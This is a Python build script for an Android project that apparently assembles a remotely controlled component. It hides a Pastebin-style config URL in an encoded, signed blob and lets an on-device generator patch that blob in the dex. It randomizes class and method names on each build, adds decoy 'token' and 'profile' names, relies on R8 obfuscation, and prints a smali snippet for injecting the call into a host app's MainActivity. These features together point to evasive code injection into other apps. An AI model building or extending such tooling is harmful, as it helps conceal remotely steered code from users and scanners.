def _pick(options):
    return secrets.choice(options)


def generate_bridge(project_root: Path):
    package = f"{_pick(_PKG_FIRST)}.{_pick(_PKG_SECOND)}"
    class_name = _pick(_CLASS_PREFIX) + _pick(_CLASS_SUFFIX)
    methods = {
        "attach": _pick(_ATTACH),
        "sample": _pick(_SAMPLE),
        "detach": _pick(_DETACH),
        "status": _pick(_STATUS),
        "resolve": _pick(_RESOLVE),
        "test": _pick(_TEST),
        "profile": _pick(_DECOY_PROFILE),
        "token": _pick(_DECOY_TOKEN),
    }
    fqcn = f"{package}.{class_name}"

    bridge_rel = Path("app/src/main/java") / Path(*package.split(".")) / f"{class_name}.java"
    generated_dir = project_root / "generated"
    generated_dir.mkdir(parents=True, exist_ok=True)
    manifest = generated_dir / "bridge-manifest.txt"

    # Remove the previous run's bridge so stale generated classes never pile up.
    if manifest.is_file():
        old_rel = manifest.read_text().strip()
        if old_rel:
            old_file = project_root / old_rel
            if old_file.is_file():
                old_file.unlink()

    source = (
        BRIDGE_TEMPLATE.replace("__PACKAGE__", package)
        .replace("__CLASS__", class_name)
        .replace("__ATTACH__", methods["attach"])
        .replace("__SAMPLE__", methods["sample"])
        .replace("__DETACH__", methods["detach"])
        .replace("__STATUS__", methods["status"])
        .replace("__RESOLVE__", methods["resolve"])
        .replace("__TEST__", methods["test"])
        .replace("__PROFILE__", methods["profile"])
        .replace("__TOKEN__", methods["token"])
    )
    bridge_file = project_root / bridge_rel
    bridge_file.parent.mkdir(parents=True, exist_ok=True)
    bridge_file.write_text(source)
    manifest.write_text(str(bridge_rel) + "\n")

    # Keep only the bridge entry points under their generated names;
    # everything behind them is obfuscated by R8.
    proguard = project_root / "app" / "proguard-generated.pro"
    proguard.write_text(
        "# AUTO-GENERATED by tools/generate_secure_link.py - do not edit by hand.\n"
        f"-keep class {fqcn} {{\n"
        f"    public static void {methods['attach']}(android.app.Activity);\n"
        f"    public static void {methods['sample']}(android.app.Activity);\n"
        f"    public static void {methods['detach']}();\n"
        f"    public static java.lang.String {methods['status']}();\n"
        f"    public static java.lang.String {methods['resolve']}();\n"
        f"    public static void {methods['test']}(android.app.Activity, java.lang.String);\n"
        "}\n"
    )

    # Ready-to-paste call snippet (names change on every generate).
    smali_class = "L" + package.replace(".", "/") + f"/{class_name};"
    snippet = generated_dir / "mainactivity-call.txt"
    snippet.write_text(
        "MainActivity call\n\n"
        "Java (MainActivity.onCreate, after super.onCreate):\n"
        f"    {fqcn}.{methods['attach']}(this);\n\n"
        "Smali (MainActivity.onCreate, after super.onCreate, p0 = this):\n"
        f"    invoke-static {{p0}}, {smali_class}->{methods['attach']}(Landroid/app/Activity;)V\n"
        "\nHost app manifest must include android.permission.INTERNET.\n"
    )
    return fqcn, methods


def rewrite_main_activity(project_root: Path, fqcn: str, methods: dict):
    path = (
        project_root
        / "app/src/main/java/com/error/updatedialogue/MainActivity.java"
    )
    text = path.read_text()
    blocks = {
        "TEST": [
            f"                {fqcn}.{methods['test']}(MainActivity.this, enteredUrl);",
        ],
        "PREVIEW": [f"                {fqcn}.{methods['sample']}(MainActivity.this);"],
        "STARTUP": [f"        {fqcn}.{methods['attach']}(this);"],
        "TEARDOWN": [f"        {fqcn}.{methods['detach']}();"],
        "EXPORT": [
            f'        String entryClass = "{fqcn}";',
            f'        String entryMethod = "{methods["attach"]}";',
        ],
    }
    for name, lines in blocks.items():
        pattern = re.compile(
            rf"(^[ \t]*// GENERATED-CALL:{name}:START[ \t]*\n).*?([ \t]*// GENERATED-CALL:{name}:END)",
            re.MULTILINE | re.DOTALL,
        )
        replacement = "\\g<1>" + "\n".join(lines) + "\n" + "\\g<2>"
        text, count = pattern.subn(replacement, text, count=1)
        if count != 1:
            sys.exit(f"MainActivity GENERATED-CALL marker missing: {name}")
    path.write_text(text)


def normalize_remote_url(url: str) -> str:
    parsed = urlparse(url.strip())
    host = (parsed.hostname or "").lower()
    if host == "pastebin.com" and not parsed.path.startswith("/raw/"):
        paste_id = parsed.path.strip("/").split("/", 1)[0]
        if paste_id:
            return f"https://pastebin.com/raw/{paste_id}"
    return url.strip()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="Remote JSON URL to lock in")
    parser.add_argument("--out", default=DEFAULT_OUT, help="Output Java file")
    parser.add_argument("--private-key", default=None, help="RSA private key PEM (optional)")
    args = parser.parse_args()

    url = normalize_remote_url(args.url)
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        sys.exit(f"Not a valid http(s) URL: {url!r}")
    if parsed.scheme != "https":
        print("WARNING: link is not https - use an https raw JSON link.", file=sys.stderr)

    url_bytes = url.encode("utf-8")
    salt = secrets.token_bytes(16)
    encoded = encode_url(url_bytes, salt)
    url_hash = hashlib.sha256(url_bytes).digest()
    public_der, signature = rsa_sign_and_public(url_bytes, args.private_key)

    import base64

    blob = (
        bytes([1])
        + len(url_bytes).to_bytes(2, "big")
        + salt
        + encoded
        + url_hash
        + len(public_der).to_bytes(2, "big")
        + public_der
        + signature
    )
    blob_b64 = base64.b64encode(blob).decode()

    out_path = Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(JAVA_TEMPLATE.replace("__BLOB__", blob_b64))

    fingerprint = url_hash.hex()[:8]
    print(f"SecureLinkConfig written: {out_path}")
    print(f"Locked link host: {parsed.netloc}  SHA-256 fingerprint: {fingerprint}")

    project_root = Path(__file__).resolve().parent.parent
    # The in-app generator needs the exact template blob string so it can
    # replace it inside the dex when a new link is generated on-device.
    blob_asset = project_root / "app/src/main/assets/template_blob.txt"
    blob_asset.parent.mkdir(parents=True, exist_ok=True)
    blob_asset.write_text(blob_b64 + "\n")
    fqcn, methods = generate_bridge(project_root)
    rewrite_main_activity(project_root, fqcn, methods)
    print(f"Generated MainActivity call: {fqcn}.{methods['attach']}(this)")
    print("Call snippet: generated/mainactivity-call.txt")


if __name__ == "__main__":
    main()
